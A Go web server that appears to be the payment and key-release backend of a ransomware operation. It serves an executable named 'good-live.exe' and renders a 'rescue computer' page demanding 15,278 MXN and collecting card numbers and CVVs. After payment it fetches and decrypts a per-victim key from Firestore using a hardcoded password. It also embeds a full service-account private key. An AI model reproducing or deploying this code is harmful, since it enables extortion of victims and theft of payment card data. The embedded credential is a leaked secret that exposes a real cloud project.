package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"text/template"

	"cloud.google.com/go/firestore"
	"google.golang.org/api/option"
)

var (
	Passer string = "contrasena"
)

// /app/download

func downloadFile(w http.ResponseWriter, r *http.Request) {
	// Ruta al archivo que quieres que se descargue
	filePath := "./good-live.exe"

	// Abre el archivo
	file, err := os.Open(filePath)
	if err != nil {
		http.Error(w, "Archivo no encontrado.", http.StatusNotFound)
		return
	}
	defer file.Close()

	// Extrae el nombre del archivo
	fileName := filepath.Base(filePath)

	// Establece las cabeceras de la respuesta
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", fileName))
	w.Header().Set("Content-Type", "application/octet-stream")

	// Envía el archivo al cliente
	http.ServeFile(w, r, filePath)
}

// /app/payload

func payloadPage(w http.ResponseWriter, r *http.Request) {
	u, err := url.ParseRequestURI(r.RequestURI)
	if err != nil {
		http.Error(w, "Error parsing URL", http.StatusBadRequest)
		return
	}
	params := u.Query()
	v := params.Get("v")

	if r.Method == "GET" {

		// Renderizar el formulario si es una solicitud GET
		tmpl := template.Must(template.New("form").Parse(`
		<!DOCTYPE html>
		<html>
		<head>
			<title>Formulario para pagar</title>
			<style>
				body {
					font-family: Arial, sans-serif;
					background-color: #f4f4f4;
					display: flex;
					justify-content: center;
					align-items: center;
					height: 100vh;
					margin: 0;
				}
				.card {
					background-color: #fff;
					border-radius: 10px;
					box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
					max-width: 400px;
					width: 100%;
					padding: 20px;
					box-sizing: border-box;
					text-align: center;
				}
				.card h2 {
					margin-top: 0;
					color: #333;
				}
				.form-group {
					margin-bottom: 15px;
					text-align: left;
				}
				label {
					display: block;
					margin-bottom: 5px;
					color: #555;
				}
				input[type="text"], input[type="number"], input[type="email"], input[type="date"] {
					width: 100%;
					padding: 10px;
					border: 1px solid #ccc;
					border-radius: 4px;
					box-sizing: border-box;
				}
				.form-group-inline {
					display: flex;
					justify-content: space-between;
				}
				.form-group-inline .form-group {
					flex: 1;
					margin-right: 10px;
				}
				.form-group-inline .form-group:last-child {
					margin-right: 0;
				}
				.card button {
					background-color: #007bff;
					color: #fff;
					border: none;
					border-radius: 5px;
					padding: 10px 20px;
					cursor: pointer;
					font-size: 16px;
					width: 100%;
				}
				.card button:hover {
					background-color: #0056b3;
				}
				.card p {
					color: #555;
				}
			</style>
		</head>
		<body>
			<div class="card">
				<h1>Rescatar a equipo {{.Heading}}</h1>
				<form action="/app/payload" method="POST">
					<div class="form-group">
						<label for="name">Monto: $15,278.00 mxn</label>
						<input type="hidden" name="code" value="{{.Heading}}">
					</div>
					<div class="form-group">
						<label for="name">Nombre en la Tarjeta</label>
						<input type="text" id="name" name="card_name" required>
					</div>
					<div class="form-group">
						<label for="card_number">Número de Tarjeta</label>
						<input type="text" id="card_number" name="card_number" maxlength="16" required>
					</div>
					<div class="form-group-inline">
						<div class="form-group">
							<label for="expiry_date">Fecha de Expiración</label>
							<input type="text" id="expiry_date" name="expiry_date" placeholder="MM/AA" required>
						</div>
						<div class="form-group">
							<label for="cvv">CVV</label>
							<input type="number" id="cvv" name="cvv" maxlength="3" required>
						</div>
					</div>
					<button type="submit">Pagar</button>
				</form>
			</div>
		</body>
		</html>
		`))

		data := struct {
			Heading string
		}{
			Heading: v,
		}

		if err := tmpl.Execute(w, data); err != nil {
			http.Error(w, "Error rendering template", http.StatusInternalServerError)
			return
		}
	} else if r.Method == "POST" {
		tmpl := template.Must(template.New("page").Parse(`
		<!DOCTYPE html>
		<html>
		<head>
			<title>Resultado del Pago</title>
			<style>
				body {
					font-family: Arial, sans-serif;
					background-color: #f4f4f4;
					display: flex;
					justify-content: center;
					align-items: center;
					height: 100vh;
					margin: 0;
				}
				.card {
					background-color: #fff;
					border-radius: 10px;
					box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
					max-width: 400px;
					width: 100%;
					padding: 20px;
					box-sizing: border-box;
					text-align: center;
					position: relative;
				}
				.card h2 {
					margin-top: 0;
					color: #333;
				}
				.card p {
					color: #555;
				}
				#codigo {
					font-weight: bold;
					font-size: 18px;
					word-wrap: break-word; /* Evita que el código se desborde */
				}
				.card button {
					background-color: #007bff;
					color: #fff;
					border: none;
					border-radius: 5px;
					padding: 10px 20px;
					cursor: pointer;
					font-size: 16px;
					width: 100%;
					margin-top: 20px;
				}
				.card button:hover {
					background-color: #0056b3;
				}
				.mensaje-exito {
					background-color: #d4edda;
					color: #155724;
					border: 1px solid #c3e6cb;
					border-radius: 5px;
					padding: 10px;
					margin-top: 10px;
					display: none; /* Oculto por defecto */
				}
			</style>
		</head>
			<body>
				<div class="card">
					<h2>Pago Procesado</h2>
					<p>Su código es:</p>
					<p id="codigo">{{.Code}}</p>
					<button onclick="copiarAlPortapapeles()">Copiar</button>
					<div id="mensajeExito" class="mensaje-exito">
						Código copiado al portapapeles
					</div>

					<script>
						function copiarAlPortapapeles() {
							// Obtener el código desde el elemento p
							var codigo = document.getElementById("codigo").textContent;

							// Crear un elemento de entrada temporal
							var elemento = document.createElement('textarea');
							elemento.value = codigo;

							// Agregar el elemento al documento
							document.body.appendChild(elemento);

							// Seleccionar el texto del elemento
							elemento.select();
							elemento.setSelectionRange(0, 99999); // Para dispositivos móviles

							// Copiar el texto seleccionado
							document.execCommand('copy');

							// Remover el elemento del documento
							document.body.removeChild(elemento);

							// Mostrar el mensaje de éxito
							var mensajeExito = document.getElementById("mensajeExito");
							mensajeExito.style.display = "block";

							// Ocultar el mensaje después de 3 segundos
							setTimeout(function() {
								mensajeExito.style.display = "none";
							}, 3000);
						}
					</script>
				</div>
			</body>
		</html>
	`))

		codigo := r.FormValue("code")

		ctx := context.Background()

		jsonString := `{
			"type": "service_account",
			"project_id": "rasw-c1904",
			"private_key_id": "adadd4267588e0761ca7522082f81735828e9007",
			"private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDT01D01jQy6GkU\ndFkgmMiXXa2tcgRoAei50BVpNCNiwES/NzAcnxvLhueWGwr8zjiPwc631cBlolYY\nZtOTm2DtIvKYlFRnODhrRHbQhDsdGJo29y4GaZoIdutbb3qnF8l/GrnkRM0VFwdT\nxomGP1U17kuj3ewflHkdVHiVAXIN9BERms7JoNV+N1DmlijozZiXAbfiWD2XM+vt\n+7R6Jp5BB8oIACzvWe6A2UI4NNXgashhCt3+XRGlxd+NA/aQYYlmt5veUdcTyaFM\nW3pWc4PNwQ+cXED60yVHgd3bFMPCPGJn2co6lWJqIobH9v7H4WsBQhog6MFK1FjH\nDdH+dsMDAgMBAAECggEAVYcNuYXhtqpjfzhJImG+IGvZK96NC+e1bY0oj/1WylEi\nkOh6GxxdLyztxgxuP8wOR3E0A8MhN4g35gtio0dJ+AWz2UqO18x570nKBYBWk/Vy\nkv3zzfAGmyNU/WrCJcRzfcgvRY1IFxtgwIE51wQsZiWs0eHRrKCY1HBebZ+TSzFE\nQzkjcnNViZpglOFOTXzC/pPMAGks1Add/MhSzaiQucU/jqoWLigvW7JEx5lDnf+j\nHbtfAsk5BJsl8Yw6mit5wnsJR6nAYzAnkzRF3LGMBsNQGuyys1YUYKwJyEnRs6yi\nxLOJ9IV5GabazNTSBVG7o96KrcGCWSWA1JkkC88AXQKBgQDqX7Nou90N+6od+AIn\nrxHMM3GtgfIb+BaKDy1dfudxscSP1+Zt6c1wOO1Kg10Psb/bjOmyk4lsAcMEWq5b\nsCTUzarLRinpvkyCtyUXrjWvSDYIpUUiUDq4eKMe8ITIm+x9TVEBOrfVgbJ6vOR5\nqjao4zLoEoH3W7FAUgHCm2dgzwKBgQDnXvw8WK+JI7bDbASW17YsQl8npQDkE17b\n1GI2b9MwbRe/SiIRVFL9AeqUXaRWgzq8BH3/joXsroLadGKJyrcxssf7yez/55O9\nlp8dhOlP677OWR5Pv9GDBKVwkJCmECZH6kBHUqK/f8tsKqdCz5FVkb1YMx06bogN\npSJYAPS/jQKBgQDPDTao+vZBySezjAsTVdVqSbROrTLfRJ9c3iWcqGT9Cyf0T66x\nQVCNqKzxG/YVzFkLM4StjytjMHdBnH7WX1laaktNgzG53rUm8XciYXPp4uhhYOgf\ndTM7DtBEoAUeWKlm1OwQIviO9SJgzgkl9pqNPxIU9Wy9wtJnWUtWygVc/wKBgQCo\ntc5fgpuc+HnQTfeatniUFWGlWuAnbyiAS4HCCBCLA0GJrtjgoghRjRAsV4v5uX8e\nknf93UMyrp2kBbHEoBitGJxSsY8rmwVT/XzQ3ZXzPQfJF5rOtCRl0QGB7yhKrwP6\n9IkieNNLqDgBC6kjQo/LQZY7tind7bMvn/ZHDYtqEQKBgGb8JuyhqtyuD9uiInOn\nT2sWZU1VsYRsk2TlQXnvW/Nxh+ZHnsrZ2Aoe3DWAil0OJ1JTREm6/Yp3+LsCdHEH\nT7ompbVXY8QsaJkbMwMs1iYwcSgr9VPEETDi5KFMBJWuJSw66g5mHUPzp5iXJ57G\n4Sh+Xoaj0G9goZ0E2n4OTPHo\n-----END PRIVATE KEY-----\n",
			"client_email": "firebase-adminsdk-bcnci@rasw-c1904.iam.gserviceaccount.com",
			"client_id": "109008166252355683987",
			"auth_uri": "https://accounts.google.com/o/oauth2/auth",
			"token_uri": "https://oauth2.googleapis.com/token",
			"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
			"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-bcnci%40rasw-c1904.iam.gserviceaccount.com",
			"universe_domain": "googleapis.com"
		}`

		sa := option.WithCredentialsJSON([]byte(jsonString))

		client, err := firestore.NewClient(ctx, "rasw-c1904", sa)
		if err != nil {
			log.Fatalf("Failed to create Firestore client: %v", err)
		}
		defer client.Close()

		// Replace "your-document-id" with the actual document ID you want to retrieve
		docRef := client.Collection("clients").Doc(codigo)

		docSnap, err := docRef.Get(ctx)
		if err != nil {
			log.Fatalf("Failed to get document: %v", err)
		}

		d := docSnap.Data()
		var a []byte
		if value, ok := d["kky"]; ok {
			// Convert the value to a string
			valueStr, ok := value.(string)
			if !ok {
				log.Fatalf("The value for 'kky' is not a string")
			}
			a, err = decrypt(valueStr)
			if err != nil {
				fmt.Println(err)
			}

		} else {
			fmt.Println("Field 'kky' does not exist in the document")
		}

		data := struct {
			Code string
		}{
			Code: string(a),
		}

		// Execute the template with the data and send the response
		if err := tmpl.Execute(w, data); err != nil {
			http.Error(w, "Error rendering template", http.StatusInternalServerError)
			return
		}

	}

	w.WriteHeader(http.StatusOK)
}

func isValidBase64(s string) bool {
	_, err := base64.StdEncoding.DecodeString(s)
	return err == nil
}

func decrypt(encryptedData string) ([]byte, error) {
	// Hash de la contraseña del servidor
	hash := md5.Sum([]byte(Passer))
	keypass := hash[:]

	// Decodificar los datos cifrados
	ciphertext, err := base64.StdEncoding.DecodeString(encryptedData)
	if err != nil {
		return nil, err
	}

	// Extraer el IV
	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	// Crear un bloque de cifrado AES
	block, err := aes.NewCipher(keypass)
	if err != nil {
		return nil, err
	}

	// Crear un stream de descifrado
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	return ciphertext, nil
}
